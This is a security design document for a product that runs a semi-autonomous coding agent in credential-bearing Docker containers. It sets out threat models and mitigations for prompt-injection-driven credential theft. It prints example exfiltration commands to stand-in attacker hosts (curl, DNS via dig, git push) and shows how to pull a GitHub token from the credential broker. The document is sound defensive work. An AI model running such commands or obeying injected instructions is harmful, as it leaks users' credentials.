---
title: Agent containment — environment-layer hardening for session containers
description: Threat model and prioritized mitigations for running a semi-autonomous agent with real credentials in a shared-kernel container, grounded in an audit of what exists today.
---

# Agent containment

ShipIt runs a semi-autonomous coding agent (Claude Code / Codex) inside a per-session
Docker container that holds **real credentials** — the user's GitHub token, their
Anthropic OAuth, and any user/MCP secrets — and, by product design (§5 of `CLAUDE.md`),
runs with **minimal human-in-the-loop friction**. The agent operates the box; the user
doesn't approve each command.

That design choice is deliberate and correct for the product. But it has a security
consequence spelled out in Anthropic's own writeup
([How we contain Claude](https://www.anthropic.com/engineering/how-we-contain-claude)):
when you remove approval friction, **environment-layer containment has to carry the
load that the model layer and human-in-the-loop cannot.** No classifier reaches 100%,
and against *direct* prompt injection — a phished or socially-engineered user pasting
attacker instructions into chat, or attacker-controlled content arriving via a cloned
repo / uploaded file / fetched URL — there is "nothing anomalous for a classifier to
catch." In that scenario the only effective defenses are **egress control and
credential isolation**.

This doc records (a) the threat model, (b) an **audit of what containment exists today**
so the gaps are concrete rather than hypothetical, and (c) a prioritized set of
mitigations. It is a design/reference doc; individual mitigations should be triaged into
the tracker as separate work items.

## Threat model

The asset at risk is **the user's credentials and the integrity of their repos/account**,
not the orchestrator host (host-escape is separately well-defended — see audit below).
The realistic attack paths, in priority order:

1. **Direct prompt injection → credential exfiltration.** Attacker content reaches the
   agent (pasted by a tricked user, embedded in a cloned repo's README/source, in an
   uploaded file, or in a fetched web page) and instructs it to read a credential and
   send it somewhere. Today this succeeds — see Gap 1 and Gap 2.
2. **Untrusted-repo code execution.** Merely opening a malicious repo runs
   attacker-controlled shell before the user has vetted anything — see Gap 3.
3. **Container escape to host.** Strongly defended today (see "What's already solid").
   Residual risk is the shared host kernel (Gap 5) and one TOCTOU note.

We are explicitly **not** trying to stop a determined user from leaking *their own*
secrets — they own them. We are trying to stop *attacker-controlled instructions* from
turning the agent into an exfiltration tool, and to stop *opening a repo* from being
equivalent to running its code.

## What's already solid (audit findings — keep, don't regress)

The container-escape surface is genuinely well-built. Recording this so future work
doesn't weaken it:

- **Docker access is a positive allowlist, never the raw socket.** Session containers
  never mount `/var/run/docker.sock`. They reach Docker over TCP through
  `docker-proxy.ts`, which is an allowlist — unmatched endpoints return 403
  (`docker-proxy.ts:525`). `DELETE /images` and container `rename`/`update` are
  explicitly blocked; ops sessions get a read-only `tecnativa/docker-socket-proxy`
  (`templates-ops.ts:69`, `:ro`).
- **Child containers are sanitized** (`docker-proxy-sanitize.ts`): no `Privileged`, no
  `CapAdd`, `NET_RAW` force-dropped, no host/container namespace sharing, no device
  maps, no `VolumesFrom`, binds restricted to the session workspace or session-labeled
  volumes, resource limits inherited. `Runtime`, `SecurityOpt`, `UsernsMode`, etc. are
  stripped so a child can't re-open what the parent closed.
- **Agent container itself is hardened**: `CapDrop: ["ALL"]` with a minimal `CapAdd`,
  `SecurityOpt: ["no-new-privileges"]` (`container-lifecycle.ts:417-420`).
- **Per-session network + label isolation**: each Docker-enabled session gets its own
  bridge network; cross-session access is blocked by source-IP identification with
  `NET_RAW` dropped to prevent spoofing.
- **Compose has real validation** (`compose-generator.ts:351-421`): rejects
  `privileged: true`, `network_mode: host`, docker-socket mounts (unless explicitly
  opted in), absolute bind paths, and `..` traversal.
- **Chat history / usage / session metadata are NOT agent-writable.** They live in the
  orchestrator-host SQLite DB (`.shipit.db`), which is never mounted into the container
  (`app-di.ts:136`). The agent cannot corrupt them from inside — this already realizes
  the article's "no-delete for must-preserve data" principle, by construction. Keep it
  that way (see Gap 6 for the inverse risk on the data that *is* mounted).
- Neither the **shared** `/credentials/.gitconfig` nor the per-workspace `.git/config`
  embeds the GitHub token — both point at the brokered `shipit-git-credential` helper
  (`session-credentials.ts:49-59`; workspace routed via SHI-72). No plaintext PAT on disk.
  But the broker remains agent-callable, so the token is still extractable on demand — see
  Gap 2-R.

## Gaps (audit findings — prioritized)

### Gap 1 — No outbound egress control *(highest priority)*

There is **no egress allowlist, firewall, DNS filter, or HTTP proxy** on session
containers. They join a standard `bridge` network with no `internal: true`
(`session-container.ts:557`, `container-lifecycle.ts:350`), no `HTTP_PROXY`/`HTTPS_PROXY`
injected (`container-lifecycle.ts` `buildEnv()`), and `NET_RAW` is dropped only to stop
IP spoofing — ordinary `curl`/`wget`/`git`/DNS egress is unaffected. `preview-proxy.ts`
is inbound-only (browser → container).

**Consequence:** an injected agent can `curl https://attacker.com/?d=$SECRET`, exfiltrate
over DNS, or `git push` to an arbitrary remote. This is the single defense the article
identifies as load-bearing once approval friction is removed, and it is absent.

This is the article's central lesson and maps directly to their proxy work, including
the subtle part: an *allowlisted* domain still becomes an exfil channel if it's a
multi-tenant service (they saw uploads to an attacker's `api.anthropic.com` account).
So the mitigation is two-layered:

- **Egress allowlist** (default-deny). Funnel container egress through an
  orchestrator-controlled proxy or an `internal` network + NAT gateway that only permits
  known hosts (Anthropic/OpenAI APIs, the configured git host, package registries).
  Inject `HTTP_PROXY`/`HTTPS_PROXY` and enforce at the network layer so a raw socket
  can't bypass the env var.
- **Identity-validating proxy** for the allowlisted multi-tenant hosts: verify the
  request carries *this user's* session token, not an attacker-supplied one, so an
  allowlisted API can't be used to upload into someone else's account.

**Design + status:** see **[egress-control.md](./egress-control.md)** for the full design.
In short: enforcement must happen at the **network layer** (an `internal` network + an
orchestrator-controlled **gateway middlebox**), not via `HTTP_PROXY` env vars — those are
honored only by cooperative clients and a raw socket bypasses them, so the env-var proxy
already on the branch is a policy engine without enforcement. The gateway delivers three
tiers, built **sequentially in one PR** (one self-contained commit per tier, each green):

- **Tier A** — iptables default-deny + `ipset` floor (Anthropic's `init-firewall.sh`
  pattern: `gh api meta` CIDR for GitHub, resolve-and-pin, `example.com`-must-fail test).
- **Tier B** — a **controlled DNS resolver** at the gateway that answers only allowlisted
  names and drives the ipset with the IPs it returns. This is the correction over
  Anthropic's reference, which leaves **DNS tunneling** open (`dig secret.attacker.com`)
  and pins stale IPs — disqualifying for our exfil threat model. Minimum tier that actually
  contains exfil.
- **Tier C** — a **transparent** SNI/CONNECT proxy (reusing `egress-allowlist.ts`) for
  hostname-level HTTPS policy, the allow-once / add-to-allowlist inline flow, and the
  Phase-2 identity hook. Being transparent, it **removes** the `HTTP_PROXY`/`NO_PROXY` env
  injection currently on the branch.

Config moves to the **browser** (default-on global toggle + per-session override +
allowlist editor), safe to mutate there because SHI-129 default-denies the container from
the orchestrator API. The **identity-validating proxy** is the **Phase-2** work on the Tier C
hook: `validateIdentity` (`sni-proxy/main.go`) now enforces **SNI-scoped tenant identity** on
configured multi-tenant hosts — permitting only the session's approved bucket/account
*surfaced in the SNI* (virtual-hosted style) and denying an attacker tenant on the same
allowlisted host. Because the proxy never decrypts TLS, identity carried only in the encrypted
path or auth header (path-style S3, per-account API keys) is **not** enforceable — see
[egress-control.md](./egress-control.md) "Phase 2" for the precise boundary and the residual.

### Gap 2 — GitHub token is host-blind *and* sits in plaintext in the workspace `.git/config` *(highest priority)*

**Empirically verified in a live session**, two compounding problems:

1. **Host-blind helper.** `configureWorkspaceRepo` (`github-auth.ts:219-227`) writes an
   inline helper into the *workspace repo's local* `.git/config`:

   ```
   git config credential.helper '!f() { echo "password=${token}"; echo "username=x-access-token"; }; f'
   ```

   The helper ignores the `host=` git feeds it on stdin and echoes the token
   **unconditionally**. Verified: `git credential fill` for `attacker.example.com`
   returns the *same* token (identical sha256) as for `github.com`. So
   `git push https://attacker.com/repo.git` hands the token to an arbitrary remote.

2. **Plaintext on disk.** Because that helper is inline, the literal `ghp_…` token lives
   in plaintext in `/workspace/.git/config` — readable with a plain file read, no git
   invocation needed. This **contradicts** the common assumption (and an earlier draft of
   this doc) that "the token is never written to disk." That assumption holds only for the
   *shared* `/credentials/.gitconfig`, which uses the broker; the per-workspace config
   does not.

This is a concrete instance of the article's "approved credential becomes an exfil
surface," and it leaks even *with* a generic egress allowlist if the attacker host is
reachable.

**Mitigation:** stop writing the inline token helper into the workspace `.git/config`;
route the workspace through the same brokered `shipit-git-credential` helper used by the
shared gitconfig, and make that broker **host-aware** — read `host=` from stdin and emit
credentials only for the configured GitHub host(s), echoing nothing otherwise. Cheap,
self-contained, high-value; ships independently of the broader egress work.

**Status (SHI-72, shipped):** both sub-problems above are fixed and verified live
(2026-06-03). The workspace `.git/config` now points at `shipit-git-credential` (no
plaintext `ghp_…` on disk), and the broker is host-aware (`git credential fill` for a
non-GitHub host returns nothing). See Gap 2-R for the residual this *doesn't* close.

### Gap 2-R — The credential broker is caller-blind (residual after SHI-72) *(highest priority)*

**Empirically verified in a live session (2026-06-03), after SHI-72 landed.** Closing the
plaintext-at-rest and host-blindness problems did **not** make the token unreachable by an
injected agent. The brokered helper is freely invokable by any code running in the
container, and it returns the full PAT for the legitimate host:

```
$ printf 'protocol=https\nhost=github.com\n\n' | git credential fill
username=x-access-token
password=ghp_…            # full 40-char token

$ printf 'protocol=https\nhost=github.com\n\n' | /usr/local/bin/shipit-git-credential get
username=x-access-token
password=ghp_…            # identical
```

The broker authorizes by **host**, not by **caller** — and the agent is indistinguishable
from `git` as a caller. This is inherent to the design: `git push` obtains its credential
by invoking exactly this helper, so anything that can run `git` can obtain the credential.
Host scoping (Gap 2) is still valuable — it stops the token being *handed to* a non-GitHub
remote via `git push https://attacker.com/…` — but it does nothing against an agent that
reads the token via the broker and then exfiltrates it by some *other* channel (e.g.
`curl https://attacker.com/?d=$TOKEN`). That exfil channel is exactly Gap 1, which is
still open, so today the residual is fully exploitable end-to-end.

In short: SHI-72 moved the token from "plaintext in a file the agent can `cat`" to
"available on demand from a broker the agent can call." For a *passive* read that's a real
improvement; for the *active* adversary in the threat model (injected agent, malicious
`agent.install`, compromised dependency) it is not a barrier.

**Mitigation (no cheap full fix — defense-in-depth):**

- **Short-lived, repo-scoped tokens.** Replace the long-lived PAT with GitHub App
  installation tokens scoped to the single repo and with a minutes-long TTL, minted
  per-turn. An extracted token then has minimal blast radius and a short exfil window.
  This is the highest-leverage move and shrinks the value of *every* credential-leak path,
  not just this one.
- **Out-of-process git.** Perform `push`/`pull`/`fetch` from the orchestrator host (which
  already has its own inline helper) rather than ever exposing a credential channel inside
  the container. The agent requests the operation over the worker API; the token never
  enters the container, so there is no broker to call. Larger change, but it removes the
  surface entirely.
- **Gap 1 egress control** as the backstop: even an extracted token can't be shipped out
  if egress is default-deny. None of these fully substitutes for the others; they compose.

**Status (SHI-79, partial — short-lived-token *mechanism* shipped):** the highest-leverage
mitigation (short-lived, repo-scoped tokens) is now wired into the credential broker, gated
behind operator-supplied GitHub App credentials:

- `github-app-token.ts` (`GitHubAppTokenMinter`) mints **single-repo-scoped GitHub App
  installation tokens** with a narrow permission set (`contents:write`,
  `pull_requests:write`, `metadata:read`) and a bounded TTL (GitHub caps installation
  tokens at 1h; we mint per-repo and cache with a 5-min refresh margin). The App JWT is
  RS256-signed with `node:crypto` — no new dependency.
- The broker prefers the minted token: `getRepoScopedGitCredential` (services/github.ts) →
  `GitHubAuthManager.mintRepoScopedToken` is consulted first by the
  `/api/sessions/:id/git/credential` route (which resolves the session's `owner/repo` from
  `remoteUrl`). Host scoping (github.com only) is still enforced first.
- **Falls back to the PAT** unchanged when no App is configured (`GITHUB_APP_ID` /
  `GITHUB_APP_PRIVATE_KEY` unset — the default today), when minting fails, or when the repo
  can't be identified — so this ships dark with zero behavior change until an operator opts
  in, and never hard-fails git for lack of an installation token (availability over
  tightness; the PAT remains the configured credential, the App token is the enhancement).

So the blast radius of an extracted broker credential drops from *account-wide, never
expiring* to *one repo, a narrow permission set, ≤1h* the moment an operator registers and
installs a GitHub App and sets the two env vars.

**The rest (still open, intentionally out of this increment):**

- **Operator GitHub App infra.** ShipIt today authenticates with the *user's own*
  PAT/OAuth token; there is no registered App. Standing one up — registration, per-user/-org
  installation discovery (the minter currently resolves the installation per repo via
  `GET /repos/{owner}/{repo}/installation`, which assumes the App is installed on the repo),
  private-key secret management/rotation — is operator-level work tracked separately.
- **Per-turn revocation** (`DELETE /installation/token`) to shrink the live window from the
  1h TTL floor toward the actual turn duration — deferred to avoid breaking the 5s-debounced
  auto-push that fires just after a turn.
- **Removing the PAT broker path** entirely once an App is mandatory, so an extracted
  credential is *always* repo-scoped, never the account-wide PAT.
- **Out-of-process git** (perform push/pull/fetch from the orchestrator host) — the other
  listed mitigation; removes the in-container credential channel entirely. Larger; separate.
- **Gap 1 egress** remains the backstop.

### Gap 3 — No trust boundary before repo-controlled code runs *(shipped — docs/178)*

**Status: shipped (`docs/178-repo-trust-gate`).** Previously, opening a freshly cloned
repo ran its `shipit.yaml` `agent.install` shell commands automatically with no user
confirmation, and compose `command:`/`build:` started the same way — the article's
**pre-trust code execution** vulnerability ("project settings and hooks executed before
trust prompts").

It is now gated by a per-remote trust boundary. `service-manager-setup.ts`
(`if (remoteUrl && !repoStore.isTrusted(remoteUrl)) { …defer… return; }`) defers
`agent.install` and compose `command:`/`build:` for any remote the user has not trusted;
`RepoStore` persists the decision (a `trusted` column with `isTrusted()`/`setTrusted()`),
and the warm-pool pre-install path is gated too. The user accepts via a one-click
`RepoTrustBanner` (`POST /api/repos/trust`); repos ShipIt creates from templates are
trusted by construction. The clone, file tree, diffs, and agent chat still work while
untrusted — only foreign-code execution is gated. Full design: `docs/178-repo-trust-gate`.

### Gap 4 — Local/agent-influenced inputs are trusted

`/uploads` and `/credentials` are mounted `:rw` (`container-lifecycle.ts:140, 126`); the
preview proxy trusts container-origin traffic. The article's guidance is that
project-open, config-load, uploaded files, and localhost connections deserve the *same*
rigor as external input — because all of them are vectors for the injected-content case
in the threat model. This is less a single fix than a lens to apply to Gaps 1/3 and to
future input surfaces (web fetch, MCP tool returns).

**Status:** the general lens shipped in SHI-98 (`docs/201`) — a reusable provenance
envelope (`shared/untrusted-input.ts`) over brokered file/upload content plus a
system-prompt rule. The **issue-text slice shipped in SHI-85** (`docs/176`): the
`shipit issue` shim wraps fetched title/body/comments in the same envelope, comments
framed lower-trust than the body. Both are defense-in-depth — the load-bearing barrier
stays the environment layer (Gap 1 egress SHI-90, Gap 2-R scoped tokens SHI-79).

### Gap 5 — Shared host kernel (gVisor / seccomp / read-only rootfs) — *SHI-97, shipped (default-OFF)*

Containers run the default `runc` runtime on the shared host kernel. The article uses
gVisor (syscall interception) for ephemeral claude.ai and full VMs for Cowork precisely
because shared-kernel isolation is the weakest tier. Given the strong cap-dropping already
in place this is lower priority than egress, but the three controls below are now wired —
each independently shippable, each **env-gated default-OFF** so merging is inert until an
operator opts in (the verify-on-a-live-host-first pattern SHI-90 used). Resolved in
`container-hardening.ts`, applied in `container-lifecycle.ts createContainer` HostConfig.

**1. gVisor (`runsc`) — decision: ADOPT as operator opt-in, default `runc`.**
`SESSION_RUNTIME=<runtime>` sets `HostConfig.Runtime` (e.g. `runsc`); unset → Docker's
default `runc`, byte-for-byte unchanged. Why opt-in rather than default-on:

- gVisor must be **registered on the Docker host** (a daemon `runtimes` entry +
  `runsc` installed). It cannot be enabled from orchestrator code alone — it's a host
  provisioning concern, so forcing it on would break every host that hasn't installed it.
- It has a **real cost on the IO/syscall-heavy `npm install` / file-watch workload**
  (gVisor intercepts every syscall in user space). That tradeoff is the operator's to make.
- Some syscalls/mount features degrade under gVisor; needs per-host validation.

So the mechanism ships now and an operator flips `SESSION_RUNTIME=runsc` on hosts where
gVisor is installed. This is the strongest tier (a user-space kernel between the agent and
the host), recommended for untrusted-repo-heavy deployments.

**2. Custom seccomp profile — `SESSION_SECCOMP=1`.** Applies the committed
`docker/seccomp/session-worker.json`; `SESSION_SECCOMP_PROFILE=<path>` overrides. When off,
Docker's **default** seccomp profile still applies — we are never `unconfined`. The
profile is read + JSON-validated by the orchestrator and embedded inline into
`HostConfig.SecurityOpt` as `seccomp=<json>` (so the Docker host needs no file); enabling
it with an unreadable/invalid profile **fails closed** (throws, container not started).

The profile is **default-deny** (`SCMP_ACT_ERRNO`) with an explicit allowlist derived from
Docker's battle-tested default and *tightened*: relative to the default it additionally
denies (→ EPERM) `ptrace`, `process_vm_readv`/`process_vm_writev` (cross-process memory
read/write + debugger attach — defeats worker/agent process isolation, a tamper/exfil
vector), `kcmp`, `userfaultfd`, `perf_event_open`, and `bpf`. The mount / namespace /
module / reboot / clock-set families that the default already gates on `CAP_SYS_ADMIN`
remain denied (we `CapDrop: ["ALL"]`), and are simply omitted from the allowlist. The
allowed set keeps everything node/npm/pnpm/yarn lifecycle scripts, git, ripgrep, gosu's
setuid drop, and playwright/chromium need (`clone`/`clone3`, `execve`, `arch_prctl`,
socket/epoll, the file + xattr calls, `setuid`/`setgid`/`setgroups`/`fchownat`, …).
Structural invariants are asserted in `container-hardening.test.ts` (default-deny, arch
coverage, essential-allowed, high-risk-denied) — **not** live kernel behavior, which needs
a real Docker host before enabling in prod.

**3. Read-only root filesystem — `SESSION_READONLY_ROOTFS=1`.** Sets
`ReadonlyRootfs: true` plus the minimal writable set. This builds directly on SHI-31's
non-root writable-path enumeration (docs/150) and is distinct from SHI-45's `:ro`
bind-mount downgrade of `/uploads`+`/credentials` (Gap 6) — this is the **whole-rootfs**
layer. The writable set splits in two:

- **Persistent writable paths stay writable for free** — `/workspace`, `/credentials`,
  `/uploads`, `/dep-cache` are already bind/volume mounts, unaffected by a read-only rootfs.
- **Image-rootfs writable paths come back as tmpfs** (`readonlyRootfsTmpfs()`): `/tmp`
  (agent scratch + Playwright MCP + npm lifecycle scripts — kept `exec`, `noexec` would
  break installs), `/run`, and `/home/shipit` (the HOME holds `~/.npm`, `~/.npm-global`,
  `~/.cache`, `~/.claude.json` — kept `exec` for `~/.npm-global/bin`). All `nosuid,nodev`.

A tmpfs over `/home/shipit` **shadows the image-baked credential symlinks**
(`.claude`→`/credentials/.claude`, `.claude.json`, `.codex`), so the non-root entrypoint
re-creates them into the tmpfs when `SHIPIT_READONLY_HOME=1` (forwarded by the
orchestrator). Auth survives because the symlink targets live in the persistent
`/credentials` mount; only caches/scratch are ephemeral (as they already are).
**ReadonlyRootfs requires the non-root runtime** (`SHIPIT_SESSION_WORKER_UID` set, prod
volume mode) — the entrypoint's prep+symlink branch runs only there; dev bind-mount mode
leaves it off.

**Enabling order / recommendation.** Seccomp and read-only rootfs are pure
HostConfig/tmpfs changes with no host prerequisite — enable + live-verify those first.
gVisor needs host provisioning, so adopt it where the host supports it. None of the three
loosen the existing escape defenses ("What's already solid"): `CapDrop: ["ALL"]` + the
minimal `CapAdd`, `no-new-privileges`, the Docker-proxy allowlist, and child sanitization
are all preserved (regression-guarded in `session-container.test.ts`).

### Gap 6 — Mounted data is `:rw` where read-only would do

`/uploads` is `:rw`, so the agent can delete the user's uploads
(`container-lifecycle.ts:140`); `/credentials` is `:rw`. The host DB is already safe
(see "what's solid"), but mount modes elsewhere are uniformly read-write. The article
calls out read-only / no-delete mount modes as a cheap structural defense. Audit each
mount and downgrade to `:ro` where the agent has no legitimate write need (uploads are a
candidate; credentials need write only during first-turn provisioning and could be
provisioned then remounted read-only).

## Prioritization

| Pri | Gap | Why first | Rough shape |
|----|-----|-----------|-------------|
| ✅ | Gap 2 — host-scoped git helper (SHI-72) | Shipped in SHI-72 — no plaintext on disk, broker host-aware | Done |
| ✅ | Open orchestrator API to containers (SHI-129) | A prompt-injected agent could `curl` the full control plane (write secrets, add MCP servers) — and widen its own Gap 1 egress allowlist | Done — bridge-IP origin guard default-denies container callers to a narrow per-session allowlist (`docs/201-container-api-trust-boundary/`) |
| P0 | Gap 2-R — broker is caller-blind (SHI-79) | Residual: agent still extracts the PAT on demand via the broker | Short-lived scoped tokens and/or out-of-process git; egress backstop |
| P0 | Gap 1 — egress allowlist | The load-bearing defense once approval friction is gone | Default-deny egress proxy / internal net + gateway; identity-validating proxy for multi-tenant hosts |
| ✅ | Gap 3 — repo trust gate | Stops "open repo == run its code" | Done — per-remote trust gate defers install/compose until the user trusts the remote (`service-manager-setup.ts`, `RepoStore.isTrusted`, `RepoTrustBanner`; `docs/178-repo-trust-gate`) |
| P2 | Gap 6 — read-only mounts (SHI-45) | Structural, low-risk | Downgrade mounts to `:ro` where possible |
| ✅ | Gap 5 — gVisor / seccomp / ro-rootfs (SHI-97) | Hardens the weakest tier | Done (default-OFF) — `SESSION_RUNTIME` (gVisor opt-in), `SESSION_SECCOMP` (custom profile), `SESSION_READONLY_ROOTFS` (`container-hardening.ts`) |
| —  | Gap 4 — untrusted-input lens (SHI-98 + issue slice SHI-85) | Cross-cutting | Apply to Gaps 1/3 and future input surfaces |

## Design principles to preserve

- **Environment over model.** These are environment-layer controls by intent — they hold
  even when a classifier or system prompt is bypassed, which is the whole point.
- **Don't regress the escape hardening.** The Docker proxy allowlist and child-container
  sanitization are good; egress/trust work must not loosen them.
- **No new shell-shaped affordance for the user** (`CLAUDE.md` §5). The trust gate is an
  accept/deny prompt, not a command button. Egress control is invisible infrastructure.
- **Prefer battle-tested primitives over custom security code** — the article's explicit
  warning. Favor gVisor, standard proxies, and kernel firewalling over bespoke filters.

## Key files (audit references)

- `src/server/orchestrator/docker-proxy.ts`, `docker-proxy-sanitize.ts`,
  `docker-proxy-auth.ts` — Docker API allowlist + child sanitization (solid).
- `src/server/orchestrator/container-lifecycle.ts` — container HostConfig, caps, mounts,
  env, network mode (Gaps 1, 5, 6).
- `src/server/orchestrator/container-hardening.ts` — Gap 5 kernel-tier resolvers
  (`SESSION_RUNTIME` gVisor opt-in, `SESSION_SECCOMP` profile, `SESSION_READONLY_ROOTFS`
  + the tmpfs writable set); `docker/seccomp/session-worker.json` is the profile;
  `docker/session-worker/entrypoint.sh` re-creates the credential symlinks into the tmpfs
  HOME under `SHIPIT_READONLY_HOME=1` (SHI-97).
- `src/server/orchestrator/session-container.ts` — network creation (Gap 1).
- `src/server/orchestrator/github-auth.ts:225` — git credential helper (Gap 2).
- `src/server/orchestrator/github-app-token.ts` — `GitHubAppTokenMinter`: short-lived,
  repo-scoped GitHub App installation tokens (Gap 2-R / SHI-79). Broker integration in
  `services/github.ts` (`getRepoScopedGitCredential`) and `api-routes-github.ts`.
- `src/server/orchestrator/service-manager-setup.ts:306`,
  `src/server/session/session-worker.ts:689` — `agent.install` + compose `command:`/`build:`
  execution, now deferred for untrusted remotes by the docs/178 trust gate (Gap 3, shipped).
- `src/server/orchestrator/compose-generator.ts:351-421` — compose validation (solid).
- `src/server/orchestrator/session-credentials.ts`, `session-agent-env.ts` — credential
  provisioning into the container (Gaps 2, 4).

## Source

Anthropic, *How we contain Claude* —
https://www.anthropic.com/engineering/how-we-contain-claude
